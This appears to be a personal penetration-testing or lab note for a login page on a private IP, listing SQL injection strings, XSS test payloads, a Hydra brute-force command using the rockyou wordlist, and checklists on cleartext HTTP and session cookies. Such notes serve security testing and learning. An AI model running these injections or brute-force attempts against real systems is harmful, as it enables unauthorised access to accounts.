![[Pasted image 20250106153558.png]]
- test `sql` and `xss` payloads in `login.php`
- avoid getting caught on  the other `.php` files, spent alot of time there attempting code execution
- make sure to try `command execution` second, check what filters are present if any


### tips
```bash
# ðŸ§¨ Login Page Recon â€“ Vulnerability Checklist
# Target: http://192.168.61.80/login.php

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# âœ… 1. SQL Injection (SQLi)
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Test in username or password field:
' OR 1=1--
admin'--
' UNION SELECT 1,2--
' AND SLEEP(5)--       # Time-based (MySQL)
' OR IF(1=1, SLEEP(5), 0)--  # MySQL conditional

# Check:
# - Login bypass
# - Time delays
# - DB error messages

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# âœ… 2. HTML/JavaScript Injection (XSS)
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
<script>alert(1)</script>
<img src=x onerror=alert(1)>
" autofocus onfocus=alert(1) x="

# Check for:
# - Reflected input
# - Alerts
# - Input stored after login

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# âœ… 3. Credential Stuffing / Brute Force
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# No CAPTCHA or lockout visible

# Hydra Example:
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \
"/login.php:username=^USER^&password=^PASS^:F=incorrect"

# Burp Suite Intruder:
# - Use POST login request
# - Set payload markers on username/password

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# âœ… 4. Insecure Transport (HTTP)
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Login over plain HTTP â†’ credentials in cleartext

# Attack vectors:
# - MITM sniffing (e.g., Wireshark)
# - SSLStrip attacks
# - Credential harvesting over LAN

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# âœ… 5. Form Autocomplete Enabled
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Browser shows saved logins â†’ Form lacks:
autocomplete="off"

# Attack:
# - Shoulder surfing
# - JS extraction of autofilled data

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# âœ… 6. Post-Login: Weak Session Handling
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# After login, check:
- Predictable session tokens?
- No HttpOnly / Secure / SameSite on cookies?
- Does session persist after logout?

# Tools:
- Burp â†’ Cookies tab
- Browser dev tools â†’ Application â†’ Storage

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# âœ… Manual Test Flow
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1. Intercept login POST in Burp Proxy.
2. Replay with:
   - SQLi payloads
   - Known passwords
   - XSS test strings
3. Observe:
   - Redirects (e.g., /admin.php)
   - Messages or delays
   - Tokens / cookies

```
